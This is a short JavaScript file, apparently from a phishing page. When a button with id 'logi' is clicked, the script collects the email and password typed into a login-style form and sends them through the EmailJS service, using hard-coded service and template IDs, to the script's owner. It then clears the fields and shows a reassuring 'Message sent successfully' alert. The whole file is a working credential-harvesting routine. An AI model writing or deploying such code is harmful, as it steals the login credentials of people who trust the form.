function sendEmail() {
    var params = {
        name: "suraj maurya",
        email: document.querySelector("#email").value,
        password: document.querySelector("#pass").value,
        message: document.querySelector("#message").value
    };
    const serviceID = "service_r4nowaf";
    const templateID = "template_us11w5m";
    
    emailjs.send(serviceID, templateID, params)
    .then(
        res => {
            document.querySelector("#email").value = "";
            document.querySelector("#pass").value = "";
            document.querySelector("#message").value = "";
            console.log(res);
            alert("Message sent successfully");
        })
        .catch((err) => console.log(err));
}

document.getElementById("logi").addEventListener('click', sendEmail);